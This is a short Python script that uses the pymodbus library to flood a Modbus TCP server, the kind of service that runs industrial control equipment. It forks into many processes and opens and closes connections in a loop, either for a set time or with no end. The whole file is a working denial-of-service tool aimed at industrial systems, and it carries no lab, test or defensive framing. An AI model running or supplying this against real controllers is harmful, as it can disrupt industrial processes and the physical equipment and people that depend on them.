#!/usr/bin/env python3

# Import required pymodbus classes
from http import client
from pymodbus.client import ModbusTcpClient
import logging
import sys
import argparse
import os
import time


def flood_modbustcp(client, duration=float('inf')):
    end_time = time.time() + duration
    while time.time() < end_time:
        if client.connect():
            client.close()
        else:
            print("Failed to connect to Modbus server.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--address", required=True, help="Server Address")
    parser.add_argument("-p", "--port", required=False, default=502, help="Server port")
    parser.add_argument("-t", "--time", required=False, help="Duration of the flood in seconds")
    args = parser.parse_args()

    logging.basicConfig()
    log = logging.getLogger()
    log.setLevel(logging.INFO)

    client = ModbusTcpClient(host=args.address, port=args.port) 

    for instance in range(5):
        os.fork()
    
    if args.time:
        flood_modbustcp(client, int(args.time))
    else:
        flood_modbustcp(client)

if __name__ == "__main__":
    main()